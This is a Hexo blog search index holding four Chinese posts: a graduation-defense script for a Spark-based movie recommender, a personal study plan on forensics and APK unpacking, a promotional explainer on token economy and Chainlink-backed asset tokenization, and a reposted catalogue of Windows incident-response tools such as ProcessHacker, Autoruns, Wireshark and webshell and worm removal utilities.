<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>毕业设计答辩编稿</title>
    <url>/2022/04/06/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E7%AD%94%E8%BE%A9%E7%BC%96%E7%A8%BF/</url>
    <content><![CDATA[<h1 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h1><p>老师们好，我是大数据专升本01班xx，下面，我将进行我的毕业设计答辩自述。</p>
<p>这是一个一整套的电影推荐系统，基于java语言、hadoop平台，spark框架。</p>
<p>web系统网站采用ssm架构对用户进行展示，用户可以在网站上浏览电影信息和查询电影，并且网站会根据用户的浏览记录给用户进行实时的电影推荐。</p>
<p>推荐系统由spark搭建，运用mysql数据库、使用ALS算法做模型训练、zookeeper +kafka 做实时推荐、通过在电影网站系统埋点，获取到用户的点击行为并将信息传至推荐系统，推荐系统根据该信息做出相应的处理，将推荐结果存入到mysql数据库中，web前端通过查询数据库将推荐的电影展示给用户。</p>
<p>其中，推荐系统主要用到的模块为ETL、模型训练、实时推荐、数据入库等。</p>
<p>ETL模块包括对数据进行基本处理、清洗、加工。</p>
<p>模型训练模块采用ALS算法，计算出模型参数。</p>
<p>实时推荐模块主要包括数据实时加工、接受和处理，主要涉及ml构建模型。</p>
<p>同时，我会详细讲解每个模块代码的基本情况及实施结果。</p>
<h1 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h1><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h3 id="遇到的问题-1"><a href="#遇到的问题-1" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p><em>1.最开始做的时候，遇到电脑不行，内存不足，</em></p>
<p>因此也可以说明，大数据平台搭建，是一个很耗费硬件的东西，当数据量大时，集群及硬件的大小就开始体现。</p>
<p><em>2.idea maven配置问题</em></p>
<p>pom.xml无法下载依赖包，但有的时候只是因为它抽风，因为本地确实存在那个包的版本。</p>
<p>还有就是，可能为仓库源的问题，多添加几个国内的仓库即可</p>
<p><em>3.spark与hive数据库无法同步</em></p>
<p>只需将hive文件下conf文件夹中的hive-site.xml文件软链接到spark文件下的conf文件夹中</p>
<h2 id="有可能的提问"><a href="#有可能的提问" class="headerlink" title="有可能的提问"></a>有可能的提问</h2><p><em>1.为什么要把数据从sql中存入hive</em></p>
<p>答：因为spark快</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>论文</tag>
      </tags>
  </entry>
  <entry>
    <title>学习计划进程表</title>
    <url>/2022/03/20/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92%E8%BF%9B%E7%A8%8B%E8%A1%A8/</url>
    <content><![CDATA[<p><strong>2022.3 -</strong> ：</p>
<p>有不少apk都是各种奇奇怪怪加固的，要了解原理，找到破解的方法</p>
<p>案件支持比较多，找背后的网站信息，以及可以调证的线索</p>
<p>算法这种比较少，是功能鉴定的时候才会要做</p>
<hr>
<p>做案件：抢红包、外挂 - 详细分析代码、鉴定功能、脱壳，抓包，寻找关键功能代码</p>
<p>取证分多种：手机、介质、服务器、反诈、物联网、渗透等等的大类，大类里面许多细分</p>
<hr>
<p>物联网：路由器、goip、voip、猫池、穿戴设备、智能家居这些都属于，算是目前还比较前沿的内容</p>
<p><strong>当前：</strong></p>
<p>货币战争</p>
<p>毕业设计</p>
<p><strong>后续：</strong></p>
<p>美亚杯（书）</p>
<p>lot物联网安全</p>
<p>金融书单（了解美第奇家族、罗斯柴尔德家族）</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>技能提升</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是通证经济/资产通证化--将链下资产连通至区块链的秘密武器及读后感</title>
    <url>/2022/04/16/%E4%BB%80%E4%B9%88%E6%98%AF%E9%80%9A%E8%AF%81%E7%BB%8F%E6%B5%8E-%E8%B5%84%E4%BA%A7%E9%80%9A%E8%AF%81%E5%8C%96-%E5%B0%86%E9%93%BE%E4%B8%8B%E8%B5%84%E4%BA%A7%E8%BF%9E%E9%80%9A%E8%87%B3%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E7%A7%98%E5%AF%86%E6%AD%A6%E5%99%A8%E5%8F%8A%E8%AF%BB%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<p>导读：通证经济是最近区块链行业提出来的一个新概念，很多人不了解什么是通证经济，以及通证经济的前景，下面我将用6句话给大家说清楚什么是通证经济。每句话后面都附带有这句话的解释，方便各位理解，请各位慢读。</p>
<p><img src alt="图片"></p>
<p>1.<strong>Token不是代币，是通证</strong></p>
<p>在网络通讯中，token 的原意是指“令牌、信令”，在以太网成为局域网的普遍协议之前，IBM 曾经推过一个局域网协议，叫做Token Ring Network，令牌环网。网络中的每一个节点轮流传递一个令牌，只有拿到令牌的节点才能通讯。这个令牌，其实就是一种权利，或者说权益证明。随着区块链概念的普及，以及以太坊及其订立的ERC20标准的出现，让任何人都可以基于以太坊发行自定义的token。市面上token被用来做ICO是普遍的做法，因此“token”开始被广泛译为“代币”，并被人们接受。但其实token可以代表任何权益证明岂止于货币，所以token被译为代币是错误的。并且恰恰相反，token可以作为任何权益的证明，但是唯独要代表货币是弊端非常大的。货币即权利，货币即政治，货币权利必须属于国家。我们可以用其他更合理的方式来使用token，或者说一个更恰当的方式来定义，token是可流通的加密数字权益证明，简称通证。</p>
<p><img src alt="图片"></p>
<p>2.<strong>通证需要具备三要素：权益、加密、流通</strong></p>
<p>通证有三个要素，缺一不可</p>
<p>第一是数字权益证明，也就是说通证必须是以数字形式存在的权益凭证，它必须代表的是一种权利，一种固有和内在的价值（Intrinsic value） 。</p>
<p>第二是加密，也就是说通证的真实性、防篡改性、保护隐私等能力，由密码学予以保障。每一个通证，就是由密码学保护的一份权利。这种保护，比任何法律、权威和枪炮提供的保护都更坚固、更可靠。</p>
<p>第三是可流通，也就是说通证必须能够在一个网络中流动，从而随时随地可以验证。</p>
<p><img src alt="图片"></p>
<p>3.<strong>通证可代表一切权益证明</strong></p>
<p>通证可以代表一切权益证明，从身份证到学历文凭，从货币到票据，从钥匙、门票到积分、卡券，从股票到债券，人类社会全部权益证明，都可以用通证来代表。人类社会的全部文明，可以说就是建立在权益证明之上，所有的账目、所有权、资格、证明等等，全部都是权益证明。就像尤瓦尔·赫拉利在《人类简史》里说的，正是这些“虚构出来的事实”才是智人脱颖而出，建立人类文明的核心原因。如果这些权益证明全部数字化、电子化，并且以密码学来保护和验证其真实性、完整性、隐私性，那么对于人类文明将是一个巨大的翻新。</p>
<p><img src alt="图片"></p>
<p>4.<strong>通证与区块链是两件不同的事情，但是彼此之间是最佳拍档</strong></p>
<p>通证是区块链最具特色的应用，不发token，区块链的魅力和威力就大打折扣。不发通证的区块链，比一个分布式数据库好不了多少。</p>
<p>区块链是新世界的后台技术，而通证是新世界的前台经济形态，两件事情完全独立，两件事情同样伟大。区块链为通证提供了坚实的信任基础，它所达到的可信度，是任何传统中心化基础设施都提供不了的，《经济学人》一语道破天机，把区块链称为“信任的机器”。我们可以从以下几点上进行分析，</p>
<p>第一，区块链是个天然的密码学基础设施，在区块链上发行和流转的通证，从 DNA 里就带着密码学的烙印，通证代表着权益，而密码学是对权益最可靠、最坚不可摧的保护。所以区块链上的通证天然就是密码学意义上的安全可信；</p>
<p>第二，区块链是一个交易和流转的基础设施。通证之“通”，就是要具有高流动性，快速交易，快速流转，安全可靠，而这恰恰就是区块链的一个根本能力。有人说区块链是互联网 TCP/IP 之上的价值交换协议。不管这种说法是否全面，它至少准确的把握了一点，区块链天然就是最适合于进行价值交换的基础设施；</p>
<p>第三，区块链是去中心化的，这使得人为篡改记录、阻滞流通、影响价格、破坏信任的难度大大提升</p>
<p>第四，通证要有内在价值和使用价值，而区块链通过智能合约，可以为通证赋予丰富的、动态的用途。</p>
<p>并不是所有的应用都有必要放在区块链上的，例如：聊天、玩游戏、听音乐、写博客、上网的程序；有必要放在区块链上的应用就是涉及到价值交换、权益管理之类的应用。</p>
<p><img src alt="图片"></p>
<p>5.<strong>通证经济是下一代互联网的数字经济</strong></p>
<p>一直以来，IT技术界痴迷于互联网的底层技术，区块链作为下一代互联网的基础设施，认为区块链重要程度高于通证，一直坚信”皮之不存毛将焉附“。</p>
<p>但随着区块链发展，我们发现正是通证以及通证经济规则，促进了比特币、以太坊的繁荣。通证经济的重要性比区块链的基础设施来的更加重要。20年来的互联网眼球经济、流量经济、粉丝经济等等，其价值重构和价值创造的速度和规模都远远超过互联网基础设施。通证立足于实体经济、为实体经济服务。</p>
<p>通证思维与现在的币圈思维有根本的不同。通证是要用起来的，而现在大多数的币，都是没有用的，甚至就不考虑能有什么用。通证启发和鼓励大家把各种权益证明，比如门票、积分、合同、证书、点卡、证券、权限、资质等等全部拿出来通证化（tokenization），放到区块链上流转，放到市场上交易，让市场自动发现其价格，同时在现实经济生活中可以消费、可以验证，是可以用的东西，这是紧贴实体经济的。所以说什么叫通证经济？就是把通证充分用起来的经济。</p>
<p>通证经济为什么能够带来新一轮数字经济革命，这个需要从以下几点进行分析。</p>
<p>第一，供给侧，通证的供给充分市场化，高度自由，任何人、任何组织、任何机构都可以基于自己的资源和服务能力发行权益证明，而且通证是运行在区块链上，随时可验证、可追溯、可交换，其安全性、可信性、可靠性是以前任何方式都达不到的。所以每一个组织和个人现在都可以很轻松的把自己的承诺书面化、“通证化”、市场化。这是人类社会从来都没有的能力。</p>
<p>第二，流通速度，这是个关键。区块链上的通证可以比以前的卡、券、积分、票快几百几千倍的流转，而且由于密码学的应用，这种流转和交易极其可靠，纠纷和摩擦将成几百几千倍的降低。如果说在传统经济时代，衡量整个社会经济发展的一个重要指标是货币流转速度，而在互联网经济时代衡量一个国家、一个城市发达程度的一个重要指标是网络流量，那么在互联网+经济的时代，通证的总流通速度将成为最重要经济衡量指标之一。当我们每个人、每个组织的各种通证都在飞速流转、交易的时候，我们的生产和生活方式将完全改变。</p>
<p>第三，价格发现。由于通证高速流转和交易，每一个通证的价格都将在市场上获得迅速的确定，这个就是通证经济的看不见的手，它比今天的市场价格讯号要灵敏和精细几百几千倍，它将把有效市场甚至完美市场推到每一个微观领域中。</p>
<p>第四，通证应用，也就是围绕通证的智能合约应用。仅此一项，就可以激发出千姿百态的创新，它创造的创新机遇、掀起的创新浪潮，将远远超过先前计算机和互联网时代的总和。</p>
<p>基于这四点认识，我们坚信通证是将我们导向下一代互联网新经济的关键。</p>
<p><img src alt="图片"></p>
<p>6.<strong>通证、区块链、大数据结合是趋势</strong></p>
<p>区块链解决陌生人的信任问题，通证经济促进了区块链的繁荣，大数据挖掘区块链上的数据价值。三者结合会开启新的数字经济时代。</p>
<p><strong>资产通证化——将链下资产连通至区块链的秘密武器</strong></p>
<p>“资产通证化”是区块链领域的一个专有名词，指某一资产对应的区块链所有权通证，并且通证可以在链上交易。虽然资产通证化最常指代的是金融资产或同质化资产通证，比如公司股票或黄金等，但它理论上也可以表示任何具有经济价值的实物或虚拟资产，比如一件艺术品、一项专利或甚至技术工作者一小时的工作时间。因此，资产通证化是区块链最具潜力的应用场景之一，其终极目标是覆盖几乎全部的人类经济活动，每年产生的经济价值预计超过几百万亿美元。</p>
<p>比起这个终极目标，更让人眼前一亮的是目前已经实现的早期应用场景。仅在过去一年，德勤、纽约梅隆银行和安永就已经开始研究资产通证化方案，并认为这个趋势有可能颠覆众多行业，其中包括年收益高达9万亿美元的全球证券行业以及价值9.6万亿的全球房地产行业。另外，微软、Vanguard和苏富比也分别宣布启动或上线资产通证化项目，为工业资产、证券和房地产发行通证。从这个角度来看，资产通证化目前已经成为了区块链领域最火的应用场景，并实现了企业级应用。</p>
<p>无论是资产通证化目前取得的初步成功，还是它的终极愿景，关键都在于它相比传统资产拥有许多独特的优势和功能。通证化可以盘活传统资产，打通投资渠道，降低投资门槛，提升资产所有权信息的透明度，并降低资产交易相关的行政成本，其中包括管理、发行和交易中介费。最后，通证化还可以为之前无法进入DeFi生态的资产提供入场券，将其打造成DeFi应用的一个模块，释放创新潜力。</p>
<p>如果你对预言机问题有所了解，就应该知道每当区块链需要与链下世界交互，就会面临风险和问题。而资产通证化本质上也依赖于链下数据，因此也无法避免这个难题。资产通证化要充分发挥其价值离不开安全的预言机，因为在通证铸造、交易和管理等关键环节都需要获取关于标的资产的准确数据。</p>
<p>本文将探讨通证资产的诸多益处，并分析Chainlink安全可靠的预言机对通证资产的发展和应用所带来的价值。</p>
<p><strong>通证资产的价值</strong></p>
<p>通证资产具有去中心化和无需信任的特点，可以代表现实世界中的产品、投资工具或服务。除此之外，它还具有许多其他价值。资产通证化最大的价值是提升资产价值和实用性，并同时降低门槛。除此之外，资产通证化还可以将链下数据连通至链上DeFi生态。</p>
<p>盘活资产</p>
<p>艺术品是典型的高价值低流动性资产。由于具有稀缺性，艺术品遵循所谓的“流动性溢价”原则，即低流动性资产的长期收益相对较高。然而，想要将手上艺术品变现的藏家们就比较头大了，因为不一定有买家愿意出到他们满意的价位。这种现象催生出了艺术品中介行业，这些中介主要的工作就是辅助藏家之间或艺术家与藏家之间的交易行为（注：比如画廊、经销商和拍卖行等）。这导致艺术品交易成本远高于其他资产，而其他低流动性的资产，比如房地产，也面临着同样的困境。</p>
<p><img src alt="图片"></p>
<p>艺术品通证化示例，Chainlink可以为通证资产提供链上估值。</p>
<p>通证化既可以使资产享受低流动性带来的益处又解决了交易成本居高不下的难题。通证化资产可以用几百万或甚至几十亿枚通证来代表，每枚通证代表几百万或几十亿分之一的资产，然后这些通证可以在各种平台上进行交易。这不仅可以去除中间成本，触及到更多潜在买家，还能保证资产的流动性溢价，因为通证是与独一无二的资产绑定的。</p>
<p>降低门槛</p>
<p>许多投资回报率最高的资产往往由于资金或监管限制而无法触及到普通投资者。比如投资一部大制作电影需要大量前期成本，而且制作团队还有可能会超出预算，因此只有财力最雄厚的投资者才有机会投资。然而，一部成功的电影可以在短时间内赚好几倍的钱。其他投资门槛高的高收益资产还包括收藏跑车、抄底海外资产以及租赁或购买公寓。</p>
<p>资产通证化的性质其实跟众筹很相似，不同之处是出钱收购资产的投资者会获得相应的投资回报。这样一来，散户投资者就可以用较低的成本收购高回报率高风险的资产。比如《帕皮卡》这部电影就采用了这个策略，电影收益按上述方式以通证形式发放。另外，CorioInvest目前也在为超级跑车发行通证。</p>
<p>提升透明性</p>
<p>许多高值资产都蒙着一层“神秘的面纱”，投资者很难看清其真实的回报率、所有权和销售记录等关键信息，因此无法理性做出判断。在投资者需要评估海外资产或因各种原因无法亲自查看资产的情况下，信息不透明就会成为很大的障碍。资产通证化最重要的一个好处是，区块链本质上是公开透明的，因此任何人都可以追踪并审计链上的所有记录。</p>
<p>资产实现通证化以后，投资者可以基于资产智能合约的逻辑看到资产的所有权记录以及回报率和收益等数据。除此之外，某些资产，比如收藏品或赛马，可能因为一些特殊属性（比如被明星拥有或是珍稀品种）而价格更昂贵。而区块链的溯源功能可以确保记录无法被篡改，这将极大提升记录的可信度并降低投资风险。这些功能有可能极大降低各个行业的欺诈风险，比如红酒、鱼子酱以及时尚和艺术等高端奢侈品行业，这些行业往往都充斥着各种伪造和欺诈现象。</p>
<p>链下资产的模块化应用</p>
<p>资产通证化最具潜力的应用领域目前才刚刚开始被人探索，那就是将链下资产变成DeFi应用的一个模块。</p>
<p>其中一个例子是DeFi Money Market，这个项目中发行了超过800万美元的汽车贷款通证。用户存入以太币、DAI、USDT或USDC，并收到mTokens，这个通证可以基于现实世界中的贷款赚取利息。这不仅提升了DeFi领域的流动性，还同时让零售投资者有机会投资过去无法触及到的资产类别。</p>
<p><img src alt="图片"></p>
<p>未来，资产通证化将为智能合约开发者带来无限机会，连通现实世界中的各种价值。将通证与各种类型的资产绑定，可以轻松打造出全新种类的合成资产、指数和通证篮子。用链下收入作抵押将为快速发展的DeFi行业注入新的创新活力。</p>
<p><strong>预言机能为资产通证化带来哪些价值？</strong></p>
<p>刚才提到了，资产通证化将丰富链下资产的应用场景并同时推动DeFi领域的发展和创新。而要实现这些场景，离不开安全可靠的预言机。要在区块链上准确地反应资产价值并交易这些资产，必须要获得真实可靠的资产数据。这在通证资产生命周期的四个环节显得尤为关键，即：通证创建，通证抵押，用户查看通证估值以及通证在二级市场销售。</p>
<p>Chainlink是区块链行业最主流的预言机，为通证资产提供关键可靠的喂价服务，并根据开发者具体的安全需求提供定制化的预言机框架。</p>
<p>不同的资产需要不同类型的预言机架构。Chainlink预言机会根据具体用例需求直接提供资产估值或提供参考数据辅助用户做判断。Chainlink可以兼容任何API和链下系统，因此能够从多个渠道获取数据，其中包括专业的数据提供商（如汽车报价数据提供商Kelly Blue Book）、独立估价机构/专家、交易平台/OTC市场或其他定制化的数据聚合商。Chainlink会基于这些数据计算出一个统一的可信估值。预言机可以由去中心化的独立Chainlink节点网络运行，网络调用链下API获取数据。另外，数据提供商/估价机构也可以自己运行Chainlink预言机，并直接将数据传输至智能合约。</p>
<p>为了进一步保障网络安全和数据质量，Chainlink还在预言机网络中采用了独特的加密经济激励机制。另外，Chainlink还发布了基于权益质押的服务协议和不可篡改的声誉系统，能够追踪估价机构、节点和数据提供商的历史服务水平。这个框架可以激励大家提供准确的估值数据，因为提供错误数据的人会被罚款，还会被扣信誉分，未来也无法再赚取收入。以后，即使是只有内行才懂的小众资产也可以进入通证市场，并通过加密经济机制保障估值数据是可靠准确的。</p>
<p><strong>预言机在通证资产中的用例</strong></p>
<p>一旦针对某一资产建立了理想的预言机网络，就可以催生出各种创新的应用场景。</p>
<p>投资组合管理</p>
<p>预言机网络可以在UI或协议层追踪投资组合中各种通证资产的价格。这样可以更客观地计算当前投资组合余额、资产交易成本以及资产在公开市场上销售的价值。另外，还可以使用智能合约自动交易资产，以管理投资组合，比如当预言机收到的价格数据达到某个阈值时自动卖出通证资产。</p>
<p>Bullionix目前正在他们的GoldLink网站上使用Chainlink的XAU/USD黄金价格喂价机制，通证价值与黄金挂钩，通证持有者可以更好地了解通证价值，并更高效地在二级市场交易手上的通证。</p>
<p>追踪抵押物</p>
<p>DeFi Money Market的用户可以抵押链下资产并在链上发行贷款，用户利用Chainlink价格参考数据为标的资产定价，以保障抵押率充足。如果发生清算，用户也可以在链上验证其抵押物被没收时的价格，这极大提升了平台的透明性和安全性。这个模式还可以用于发行稳定币或开发其他抵押金融工具。</p>
<p>通证和收益分配方式</p>
<p>价格预言机确定资产价值后，用户可以将资产通证化并用Chainlink预言机验证意向买家的资质，以确保合规。另外，Chainlink还推出了Chainlink VRF（可验证函数）等工具，在供不应求时以公平的方式分配通证资产，并保证过程的可验证性。比如GET Protocol会从名单中挑选买家出售门票。</p>
<p>如果资产升值可以导致通证产生收益，Chainlink预言机还可以用于计算通证持有者定期获得的收益。</p>
<p>为资产篮子定价</p>
<p>不同类型的资产通证可以组合成各种通证池或资产篮子，在链上创建衍生品进行交易，并绑定真实资产价值。比如说，可以在通证资产篮子中放入多个稳定币，这就需要定期输入价格数据，在市场出现变化时重新进行平衡。自动化管理的资产组合也会设置每类资产权重，因此就需要所有标的资产的价格数据，定期调整买进和卖出量，以维持目标收益率。</p>
<p><strong>总结</strong></p>
<p>虽然资产通证化仍在早期发展阶段，但却是区块链技术最有潜力的应用场景之一。不过话又说回来，如果没有Chainlink这样安全可靠的预言机作支撑，资产通证的链上价值会受到极大限制，而且中心化的风险会在很大程度上损害通证的核心价值主张。因此，只有部署Chainlink去中心化预言机获取链下数据才能充分覆盖所有类型的资产，并为其带来最大价值。</p>
<p><strong>通证经济所用到的四个基本特性</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“区块链有什么用？”</span><br><span class="line"></span><br><span class="line">答案藏在区块链的技术与经济基础特性中。</span><br><span class="line"></span><br><span class="line">观察了以太坊带来的变化后，区块链特征以及这些特征相关的应用已经较为清晰地展现在我们面前。这四个基础特性分别是：不可篡改；智能合约；不可复制的唯一性；去中心自组织或社区化。</span><br><span class="line"></span><br><span class="line">区块链不只是技术，它还将从经济、管理、社会层面带来变化，它可能改变人类交易的方式，它将改变货币、账本、合同、协同等方面，这是稍后要讨论的。</span><br><span class="line"></span><br><span class="line">本文摘编自方军的一本即将出版的区块链普及书籍，这可能是第一本从互联网视角讨论区块链的书。</span><br></pre></td></tr></table></figure>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应工具</title>
    <url>/2022/04/11/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p><strong>原创作者:</strong> <em>nul1</em></p>
<p><strong>转自: <a href="https://www.cnblogs.com/nul1">https://www.cnblogs.com/nul1</a></strong></p>
<h3 id="1-进程分析工具"><a href="#1-进程分析工具" class="headerlink" title="1 进程分析工具"></a>1 进程分析工具</h3><p>1.1 ProcessHacker<br>功能：ProcessHacker 是一款不错的进程分析工具，可查看所有进程信息，包括进程加载的 dll、进程打开的文件、进程读写的注册表……，也可以将特定进程的内存空间 Dump 到本地，此外还可以查看网络连接。<br>工具截图如下：<br><img src="/.io//blog\source_posts\应急响应工具\1.png" alt="图片"></p>
<p>注：查看具体进程的详细信息，双击 Processes 列表中的进程名字即可。<br>1.2 ProcessExplorer<br>功能：ProcessExplorer 是一款不错的进程分析工具，微软官方推荐工具，稳定性和兼容性相对不错。可查看所有进程的信息，包括其加载的 dll、创建的线程、网络连接……，同样可以 Dump 出进程的内存空间到本地。<br><img src="/.io//blog\source_posts\应急响应工具\2.png" alt="图片"></p>
<p>1.3 ProcessMonitor<br>功能：ProcessMonitor 是一款实时刷新的进程信息监控工具，微软官方推荐工具，稳定性和兼容性也是相对出色。展示的信息很全面，且每一个打开的句柄、注册表、网络连接…… 都与具体的进程关联起来。<br><img src="/.io//blog\source_posts\应急响应工具\3.png" alt="图片"></p>
<p>1.4 XueTr<br>功能：XueTr（官网 <a href="http://www.xuetr.com)是一个/">www.xuetr.com）是一个</a> Windows 系统信息查看软件，可协助排查木马、后门等病毒，功能包含：</p>
<ol>
<li>进程、线程、进程模块、进程窗口、进程内存、定时器、热键信息查看，杀进程、杀线程、卸载模块等功能</li>
<li>内核驱动模块查看，支持内核驱动模块的内存拷贝<br>3.SSDT、Shadow SSDT、FSD、Keyboard、TCPIP、Classpnp、Atapi、Acpi、SCSI、Mouse、IDT、GDT 信息查看，并能检测和恢复 ssdt hook 和 inline hook<br>4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego 等 Notify Routine 信息查看，并支持对这些 Notify Routine 的删除</li>
<li>端口信息查看</li>
<li>查看消息钩子</li>
<li>内核模块的 iat、eat、inline hook、patches 检测和恢复</li>
<li>磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除</li>
<li>注册表编辑</li>
<li>进程 iat、eat、inline hook、patches 检测和恢复</li>
<li>文件系统查看，支持基本的文件操作</li>
<li>查看（编辑）IE 插件、SPI、启动项、服务、Host 文件、映像劫持、文件关联、系统防火墙规则、IME<br>13.ObjectType Hook 检测和恢复<br>14.DPC 定时器检测和删除<br>15.MBR Rootkit 检测和修复</li>
<li>内核对象劫持检测</li>
<li>其它一些手工杀毒时需要用到的功能，如修复 LSP、修复安全模式等<br><img src="/.io//blog\source_posts\应急响应工具\4.png" alt="图片"></li>
</ol>
<p>1.5 PCHunter<br>功能：XueTr 的增强版，功能和 XueTr 差不多，可参考上图。推荐更多使用 PCHunter，减少出故障的概率。</p>
<p>1.6 ProcessDump<br>功能：可对指定的进程，将其进程空间内的所有模块单独 Dump 出来，甚至可 Dump 出隐藏的模块（即进程加载的 dll，这里通常是被注入）。<br><img src="/.io//blog\source_posts\应急响应工具\5.png" alt="图片"></p>
<p>注：这是个命令行工具。</p>
<p>1.7 PsTools<br>功能：PsTools 是命令行工具集，微软官方推荐，功能多而全，其涵盖的子功能（命令）如下：<br><img src="/.io//blog\source_posts\应急响应工具\6.png" alt="图片"></p>
<h3 id="2-流量分析工具"><a href="#2-流量分析工具" class="headerlink" title="2 流量分析工具"></a>2 流量分析工具</h3><p>2.1 Wireshark<br>功能：Wireshark 是一款常用的网络抓包工具，同时也可以用于流量分析。<br><img src="/.io//blog\source_posts\应急响应工具\7.png" alt="图片"></p>
<p>2.2 科来网络分析<br>功能：科来公司的一款流量分析工具，对比 Wireshark 要相对易用些（特别是流量分析入门人员），此外，该工具会自动将流量进行归类和统计。在某种意味上，还是比较方便的。<br><img src="/.io//blog\source_posts\应急响应工具\8.png" alt="图片"></p>
<p>2.3 TCPView<br>功能：查看系统的网络连接详情，每一条连接对应的进程、协议、进程、源目地址、源目端口、连接状态…… 总之，可展示当前活跃连接的所有详细信息。<br><img src="/.io//blog\source_posts\应急响应工具\9.png" alt="图片"></p>
<h3 id="3-启动项分析工具"><a href="#3-启动项分析工具" class="headerlink" title="3 启动项分析工具"></a>3 启动项分析工具</h3><p>3.1 AutoRuns<br>功能：一款不错的启动项分析工具，微软官方推荐。只要涉及到启动项相关的信息，事无巨细，通通都可以查询得到，非常方便找到病毒的启动项。<br><img src="/.io//blog\source_posts\应急响应工具\10.png" alt="图片"></p>
<h3 id="4-信息收集工具"><a href="#4-信息收集工具" class="headerlink" title="4 信息收集工具"></a>4 信息收集工具</h3><p>4.1 FastIR<br>功能：收集操作系统的关键日志、关键信息，方便后续取证和排查分析。</p>
<p>4.2 BrowsingHistoryView<br>功能：收集浏览器的历史记录，方便追溯域名、URL 的访问来源是否源自于用户行为。</p>
<h3 id="5-辅助工具"><a href="#5-辅助工具" class="headerlink" title="5 辅助工具"></a>5 辅助工具</h3><p>5.1 Hash<br>功能：文件 hash 计算工具，可计算文件 MD5、SHA1、CRC 值，可用于辅助判断文件是否被篡改，或者使用哈希值到威胁情报网站查看是否为恶意文件。<br><img src="/.io//blog\source_posts\应急响应工具\11.png" alt="图片"></p>
<p>5.2 ntfsdir<br>功能：病毒也有可能是以创建服务启动项的方式保持长久运行，点击 Autoruns 的 Services 功能，如下图，检查是否有异常的服务启动项。</p>
<p>5.3 Unlocker<br>功能：可对难以删除的文件进行强制删除（包括锁定的文件），需安装，安装后右键菜单”Unlocker“即可弹出如下界面：<br><img src="/.io//blog\source_posts\应急响应工具\12.png" alt="图片"></p>
<h3 id="6-Webshell-查杀工具"><a href="#6-Webshell-查杀工具" class="headerlink" title="6 Webshell 查杀工具"></a>6 Webshell 查杀工具</h3><p>6.1 wscan<br>功能：深信服自研的一款 Webshell 查杀工具。<br><img src="/.io//blog\source_posts\应急响应工具\13.png" alt="图片"></p>
<p>6.2 D 盾<br>功能：D 盾是迪元素科技的一款 Webshell 查杀工具。<br><img src="/.io//blog\source_posts\应急响应工具\14.png" alt="图片"></p>
<h3 id="7-专杀工具"><a href="#7-专杀工具" class="headerlink" title="7 专杀工具"></a>7 专杀工具</h3><p>7.1 飞客蠕虫专杀<br>功能：专门针对飞客蠕虫病毒进行查杀的工具。<br>飞客蠕虫专杀工具有 kidokiller（卡巴斯基出品）、TMCleanTool（趋势科技出品）。<br>Kidokiller 运行截图如下，红色方框的所有 0 值表明没有中飞客蠕虫，如果有非 0 值，即说明中了飞客蠕虫。<br><img src="/.io//blog\source_posts\应急响应工具\15.png" alt="图片"></p>
<p>TMCleanTool 的运行截图如下，有威胁项即表明中了飞客蠕虫。<br><img src="/.io//blog\source_posts\应急响应工具\16.png" alt="图片"></p>
<p>7.2 Ramnit 专杀<br>功能：专门针对 Ramnit 类家族病毒进行查杀的工具。<br>FxRamnit 是赛门铁克出品的 Ramnit 专杀工具，其运行界面如下，点击”Start“按钮即可：<br><img src="/.io//blog\source_posts\应急响应工具\17.png" alt="图片"></p>
<p>注：由于 Ramnit 是全盘感染性病毒，故此专杀工具运行时间比较长，需耐心等待（FxRamnit 常常给人一种” 假死 “的感觉）。</p>
